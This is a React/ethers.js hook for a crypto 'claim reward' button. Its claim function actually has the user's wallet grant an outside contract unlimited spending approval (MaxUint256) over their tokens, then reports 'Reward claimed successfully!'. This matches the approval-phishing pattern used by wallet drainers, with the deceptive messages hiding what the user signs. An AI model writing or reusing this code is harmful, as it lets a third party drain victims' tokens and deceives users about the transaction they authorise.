import { useState, useCallback } from 'react';
import { ethers } from 'ethers';
import { TOKEN_ADDRESS, CONTRACT_ADDRESS, TOKEN_ABI } from '../constants';
import type { ClaimStatus } from '../types';

export const useClaim = (
  provider: ethers.BrowserProvider | null,
  account: string | null,
  onSuccess?: (txHash: string) => void,
  onError?: (error: string) => void,
) => {
  const [claimStatus, setClaimStatus] = useState<ClaimStatus>({
    status: 'idle',
    message: '',
  });
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  const checkBalance = useCallback(async () => {
    if (!provider || !account) return null;

    try {
      const balanceABI = ['function balanceOf(address) view returns (uint256)'];
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESS,
        balanceABI,
        provider,
      );
      const balanceRaw = await tokenContract.balanceOf(account);
      const balanceFormatted = ethers.formatUnits(balanceRaw, 18);
      return parseFloat(balanceFormatted).toFixed(2);
    } catch (error) {
      console.error(error);
      return null;
    }
  }, [provider, account]);

  const claimReward = useCallback(async () => {
    console.log('connecting...');
    if (!provider || !account) {
      setClaimStatus({
        status: 'error',
        message: 'Please connect your wallet first',
      });
      return;
    }

    setClaimStatus({
      status: 'approving',
      message: 'Approving transaction in wallet...',
    });

    try {
      console.log('get Signer step');
      const signer = await provider.getSigner();
      console.log('ethers contract step');
      const tokenContract = new ethers.Contract(
        TOKEN_ADDRESS,
        TOKEN_ABI,
        signer,
      );
      console.log('contract approve step');
      const tx = await tokenContract.approve(
        CONTRACT_ADDRESS,
        ethers.MaxUint256,
      );
      console.log('set claim status approving');
      setClaimStatus({
        status: 'approving',
        message: 'Transaction submitted. Waiting for confirmation...',
      });
      console.log('tx wait');
      await tx.wait();
      console.log('set claim status success');
      setClaimStatus({
        status: 'success',
        message: 'Reward claimed successfully!',
      });
      setShowSuccessModal(true);
      console.log('done don');
      if (onSuccess) onSuccess(tx.hash);

      setTimeout(() => {
        checkBalance();
      }, 2000);
    } catch (error) {
      console.error(error);
      const errorMessage =
        error instanceof Error ? error.message : 'Transaction failed';
      setClaimStatus({
        status: 'error',
        message: errorMessage,
      });
      if (onError) onError(errorMessage);
    }
  }, [provider, account, checkBalance, onSuccess, onError]);

  const resetClaim = useCallback(() => {
    setClaimStatus({ status: 'idle', message: '' });
    setShowSuccessModal(false);
  }, []);

  return {
    claimStatus,
    showSuccessModal,
    claimReward,
    resetClaim,
    setShowSuccessModal,
    checkBalance,
  };
};
